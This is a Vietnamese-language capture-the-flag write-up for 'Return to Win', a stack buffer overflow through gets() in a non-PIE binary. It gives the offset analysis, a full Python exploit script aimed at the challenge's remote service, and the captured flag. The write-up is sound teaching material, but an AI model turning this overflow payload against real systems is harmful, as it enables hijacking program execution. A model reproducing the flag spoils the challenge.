---
title: "Return to Win"
category: "Pwn"
tags: ["stack-buffer-overflow", "gets", "ret2win", "non-pie"]
solve_date: "2026-10-09"
language: "vi"
---

# Return to Win

**Flag:** `OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}`
**Dịch vụ:** `nc 145.239.142.129 1340`. **Artifact:** `ret2win.zip` (2825 B), chứa `main.out` (16248 B, ELF 64-bit).

## Đề bài

Binary được tặng kèm (Easy, 100 điểm); chương trình in `Hi, what's your name?` rồi đọc một chuỗi bằng `gets()`, sau đó in lời chào. Trong binary có sẵn hàm `win()` đọc và in `flag.txt`. Mục tiêu là chuyển luồng thực thi sang `win()` trên tiến trình đang chạy tại dịch vụ remote.

## Phân tích

`readelf -h main.out` trả `Type: EXEC (Executable file)` và `r2 -q -c "i~type,pic" main.out` báo `pic false`, nên địa chỉ hàm là hằng số, không cần bước leak. Lệnh checksec trong bản ghi không in ra output, vì vậy ngoài kết luận non-PIE không khẳng định thêm trạng thái guard nào khác từ checksec; riêng `main.out` không tham chiếu `__stack_chk_fail` (`readelf -sW main.out | grep -c __stack_chk_fail` trả `0`), tức `hello()` kết thúc bằng `ret` mà không có bước kiểm canary.

Symbol table:

```text
25  0x000011f6 0x004011f6 GLOBAL FUNC   104      hello
33  0x0000125e 0x0040125e GLOBAL FUNC   146      win
```

`hello()` tại `0x4011f6`:

```text
0x004011fe  4883ec10     sub rsp, 0x10
0x00401220  488d45f6     lea rax, [rbp - 0xa]
0x0040122c  e89feffff    call sym.imp.gets
```

Buffer bắt đầu ở `rbp-0xa` và return address nằm ở `rbp+8`, khoảng cách cần lấp là `0xa + 8 = 18` byte. `gets()` không có giới hạn độ dài nên phần ghi đè nằm hoàn toàn trong tay người gọi.

`win()` tại `0x40125e` gọi `fopen("flag.txt", "r")`, `fgets` vào buffer `rbp-0x50`, in bằng `printf("%s")` rồi `exit`. Nhánh `fopen` thất bại in `Please create 'flag.txt' in this directory with your own debugging flag.`; zip artifact không kèm `flag.txt`, nên cờ chỉ tồn tại trên instance remote.

## Lời giải

Gửi payload gồm 18 byte filler và 8 byte địa chỉ `win()` theo little-endian — 26 byte ghi đè — rồi kết thúc bằng `\n` để `gets()` dừng đọc và `hello()` `ret` thẳng vào `win`:

```python
payload = b"A" * 18 + struct.pack("<Q", 0x40125e) + b"\n"
```

Ba byte thấp của địa chỉ (`5e 12 40`) xuất hiện lại trong dòng chào vì `printf("Hello, %s!\n")` chạy trước `ret` và in tới NUL đầu tiên; năm byte `00` phía sau trùng đúng với phần cao còn trống của một địa chỉ 48-bit trong không gian non-PIE, nên không cần kỹ thuật tránh NUL.

Hai lần chạy đọc được cùng một phản hồi:

```text
[*] after payload: b'Hello, AAAAAAAAAAAAAAAAAA^\x12@!\nOWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}'
```

## Kết quả

```text
OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 (`socket`, `struct`), `unzip`, và tùy chọn `binutils`/`radare2` để kiểm tra tĩnh. Không dùng pwntools.

```console
$ unzip ret2win.zip
$ readelf -h main.out | grep Type
$ readelf -sW main.out | grep -c __stack_chk_fail
$ r2 -q -c "is" main.out | grep -E "hello|win"
```

Lưu script dưới đây thành `exploit.py` rồi chạy `python exploit.py`; script chỉ nối tới remote nên không cần đặt cạnh binary.

```python
import socket, struct, sys

HOST, PORT = "145.239.142.129", 1340
WIN = 0x40125e
OFF = 0xa + 8  # buffer at rbp-0xa, return addr at rbp+8

payload = b"A" * OFF + struct.pack("<Q", WIN) + b"\n"

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(15)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if b"name" in data:
            break
except socket.timeout:
    pass
print("[+] prompt:", repr(data))
s.sendall(payload)
out = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass
s.close()
print("[*] after payload:", repr(out))
```

Địa chỉ `0x40125e` lấy từ artifact `main.out`; nếu dịch vụ đổi binary, đọc lại symbol table trước khi chạy.
